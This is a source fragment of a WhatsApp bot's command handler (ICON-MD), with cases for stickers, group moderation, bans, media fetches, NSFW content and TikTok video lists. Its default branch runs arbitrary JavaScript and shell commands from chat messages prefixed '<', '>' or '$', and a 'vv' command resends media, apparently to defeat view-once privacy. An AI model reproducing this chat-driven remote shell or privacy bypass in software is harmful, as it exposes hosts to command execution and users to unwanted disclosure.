▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
  `
rich.sendMessage(m.chat, { text:teks, mentions: await rich.parseMention(teks)}, {quoted:m})
} catch {
reply("check!")
}
}
break;
case 'brat': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
            if (!q) return reply(`Send command with text. ${prefix + command}`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, rich, m);
        }
       break;
  case 'furbrat': {
   if (isban) return reply(`Sorry, only the owner can use this command`)
            if (!q) return reply(`Send command with text. ${prefix + command}`)
            const imageUrl = `https://fastrestapis.fasturl.link/tool/furbrat?text=${q}`
            await makeStickerFromUrl(imageUrl, rich, m);
        }
       break;
case 'tourl': {    
 if (isban) return reply(`Sorry, only the owner can use this command`)
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return m.reply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('Failed to download media!');
    }

    const uploadImage = require('../system/Data6');
    const uploadFile = require('../system/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('Failed to upload media!');
    }

    rich.sendMessage(m.chat, {
        text: `Done. Url: ${link}`
    }, { quoted: m });
}
break;
 
           case 'waifu': {
            if (isban) return reply(`Sorry, only the owner can use this command`)
 replygc(mess.wait)
await sleep(100);
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      rich.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command}!`}, {quoted: m})    
            }
            break
           case'nsfw': {
            if (isban) return reply(`Sorry, only the owner can use this command`)
  try {

    const apiUrl = 'https://draculazyx-xyzdrac.hf.space/api/hentai';
    console.log("API URL:", apiUrl);

    const response = await fetch(apiUrl);

    if (!response.ok) {
        console.error(`HTTP error! Status: ${response.status}`);
        throw new Error(`HTTP error! Status: ${response.status}`);
    }
    const contentType = response.headers.get('Content-Type');
    console.log("Content-Type:", contentType);

    if (!contentType || !contentType.includes('application/json')) {
        const text = await response.text();
        console.error("Received non-JSON response:", text);
        throw new Error(`Expected JSON, but received: ${contentType || 'no Content-Type'}.  Raw response: ${text}`);
    }

    const data = await response.json();

    if (data && data.videoUrl) {
      const videoUrl = data.videoUrl;
      const title = data.title;
      const description = data.description;
      const resolution = data.resolution;
      const thumbnailUrl = data.thumbnailUrl;

      const apiText = `
-  *Video Title:* ${title}\n
-  *Video Description:* ${description}\n
-  *Resolution:* _${resolution}_
`;

      await rich.sendMessage(
        m.chat,
        {
          video: { url: videoUrl },
          caption: apiText,
          footer: 'Hentai is a adult content, you have been warned', // Adiciona aviso sobre o conteúdo
        },
        { quoted: m }
      );
    } else {
      console.warn("premium-hentai: No video URL received from API or data is missing.");
      await rich.sendMessage(m.chat, { text: "Could not retrieve premium content. Please try again later." }, { quoted: m });
    }
  } catch (error) {
    console.error("Error during premium hentai retrieval:", error);
    await conn.sendMessage(m.chat, { text: `An error occurred while retrieving premium content. Please try again later. Error: ${error.message}` }, { quoted: m });
  }
  }
  break;
  case 'shorturl':{
 if (isban) return reply(`Sorry, only the owner can use this command`)
if (!text) return m.reply('Invaild link/url')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) return m.reply(`Error generating a short URL.`);
let done = `✅Done \n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
m.reply(done)
}
break;
case 'vv': {
if (!isCreator) return m.reply("Owner only.");
 if (isban) return reply(`Sorry, only the owner can use this command`)
    if (!m.quoted) return reply('Please reply to an image, video, or voice note.');

    try {
        // Download the quoted media
        const mediaBuffer = await rich.downloadMediaMessage(m.quoted);

        if (!mediaBuffer) {  
            return reply('Failed to download media.Try again.');  
        }  

        // Determine the media type  
        const mediaType = m.quoted.mtype;  

        if (mediaType === 'imageMessage') {  
            await rich.sendMessage(m.chat, {   
                image: mediaBuffer,   
                caption: "*image by ICON-MD*"   
            }, { quoted: m });
        } else if (mediaType === 'videoMessage') {  
            await rich.sendMessage(m.chat, {   
                video: mediaBuffer,   
                caption: "video by ICON-MD"   
            }, { quoted: m });
        } else if (mediaType === 'audioMessage') {  
            await rich.sendMessage(m.chat, {   
                audio: mediaBuffer,   
                mimetype: 'audio/ogg', // Ensures proper voice note playback  
                ptt: true, // Sends it as a voice note  
                caption: "Done"   
            }, { quoted: m });
        } else {  
            return reply('Please reply to an image, video, or voice note.');  
        }
    } catch (error) {
        console.error('Error:', error);
        await replyn('An error occurred. Try again.');
    }
}
break;
//== ban function by Richie == //
case "ban": case "banuser": {
 if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("Owner only.");
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (ban.includes(orang)) return m.reply(`*User ${orang.split('@')[0]} is already banned*`)
await ban.push(orang)
await fs.writeFileSync("./start/lib/banned.json", JSON.stringify(ban))
m.reply(`\`\`\`user ${orang.split('@')[0]} banned from using the bot\`\`\``)
} else {
return m.reply(example("/@tag/234XXX/reply to chat"))
}}
break;
case "unban": case "unbanuser":  {
 if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("Owner only.");
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!ban.includes(orang)) return m.reply(`user ${orang.split('@')[0]} not found in banlist`)
let indx = ban.indexOf(orang)
await ban.splice(indx, 1)
await fs.writeFileSync("./start/lib/banned.json", JSON.stringify(ban))
m.reply(`user  ${orang.split('@')[0]} unbanned your free to use the bot`)
} else {
return m.reply(example("@tag/234XX/reply to chat"))
}}
break
case "listban": case "listbanuser": {
 if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("Owner only.");
if (ban.length < 1) return m.reply("no banned users yet ")
let teksnya = `banned user here`
ban.forEach(e => teksnya += `@${e.split("@")[0]}\n`)
await rich.sendMessage(m.chat, {text: teksnya, mentions: [... ban]}, {quoted: m})
}
break;
// end ban function by richie 
case 'closetime': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('admin first')
if (!isBotAdmins) return reply('Bot must be admin first')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
rich.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
}
break;

case 'opentime': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('admins only')
if (!isBotAdmins) return reply('Bot must be admin first')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
rich.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break;
            case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('Bots Must Be Admins First')
if (!isAdmins) return reply('Admin only!')
rich.groupRevokeInvite(m.chat)
}
break;
case 'everyone': 
 if (isban) return reply(`Sorry, only the owner can use this command`)
 rich.sendMessage(m.chat, {
text: "everyone" + m.chat,
contextInfo: {
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'Icon wave'
}
]
}
}
)
break;
case 'getpp':{
 if (isban) return reply(`Sorry, only the owner can use this command`)
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await rich.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
rich.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break;
case "get": {
 if (isban) return reply(`Sorry, only the owner can use this command`)
if (!/^https?:\/\//.test(text)) return m?.reply('Prefix *URL* with http:// or https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
m?.reply(`Content-Length: ${res.headers.get('content-length')}`)
}
if (!/text|json/.test(res.headers.get('content-type'))) return rich.sendMessage(m?.chat, url, 'file', `Link: ${linknyaurl}`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
m?.reply(txt.slice(0, 65536) + '')
}
}
break;

case 'fact':
 if (isban) return reply(`Sorry, only the owner can use this command`)
    const bby = "https://apis.davidcyriltech.my.id/fact";

    try {
        const nyash = await axios.get(bby);
        const bwess = 'https://files.catbox.moe/ba5km9.jpg';
        const ilovedavid = nyash.data.fact;
        await rich.sendMessage(m.chat, { image: { url: bwess }, caption: ilovedavid });
    } catch (error) {
        reply("An Error Occured.");
    }
    break;
   
  case 'yts': case 'ytsearch': {
  if (isban) return reply(`Sorry, only the owner can use this command`)
                if (!text) return reply(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                rich.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
  case 'tiktokgirl':
  if (isban) return reply(`Sorry, only the owner can use this command`)
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktokghea': 
if (isban) return reply(`Sorry, only the owner can use this command`)
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktokbocil': 
if (isban) return reply(`Sorry, only the owner can use this command`)
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktoksexy':
if (isban) return reply(`Sorry, only the owner can use this command`)
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktoksantuy':
if (isban) return reply(`Sorry, only the owner can use this command`)
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktokkayes':
if (isban) return reply(`Sorry, only the owner can use this command`)
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktokpanrika':
if (isban) return reply(`Sorry, only the owner can use this command`)
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktoknot':
if (isban) return reply(`Sorry, only the owner can use this command`)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'animewlp':{
if (isban) return reply(`Sorry, only the owner can use this command`)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;

case 'autobio':
if (isban) return reply(`Sorry, only the owner can use this command`)
       if (!isCreator) return m.reply("Owner only.");
                if (args.length < 1) return replyg(`Example: ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
                break;
             
case "listgc":{
if (isban) return reply(`Sorry, only the owner can use this command`)
let getGroups = await rich.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await rich.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
m.reply(teks)
}
break;
case 'style': {
    if (args.length < 2) return reply('Usage: style <style_name> <text>\nExample: style fancy Hello World');

    const styleName = args[0].toLowerCase();
    const text = args.slice(1).join(' ');

    const styleMap = {
        fancy: (t) => t.split('').map(c => fancyCharMap[c] || c).join(''),
        cursive: (t) => t.split('').map(c => cursiveCharMap[c] || c).join(''),
        glitch: (t) => t.split('').map(c => glitchCharMap[c] || c).join(''),
        bubble: (t) => t.split('').map(c => bubbleCharMap[c] || c).join(''),
        // add more styles here
    };

    if (!styleMap[styleName]) {
        return reply(`Invalid style. Available styles:\n${Object.keys(styleMap).join(', ')}`);
    }

    const styledText = styleMap[styleName](text);
    reply(styledText);
    break;
}

break;
 
case 'public': {
if (isban) return reply(`Sorry, only the owner can use this command`)
    if (!isCreator) return m.reply("Owner only.");
    rich.public = true;
    m.reply("ICON MD IS NOW ON PUBLIC MODE");
}
break;
case 'private': case 'self': {
if (isban) return reply(`Sorry, only the owner can use this command`)
    if (!isCreator) return m.reply("Owner only.");
    rich.public = false;
    m.reply("ICON MD IS NOW ON PRIVATE MODE");
}
break;

case 'runtime': case 'alive': { 
if (isban) return reply(`Sorry, only the owner can use this command`)
         reply(`ICON-MD is active ${runtime(process.uptime())} `); 
}
break

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})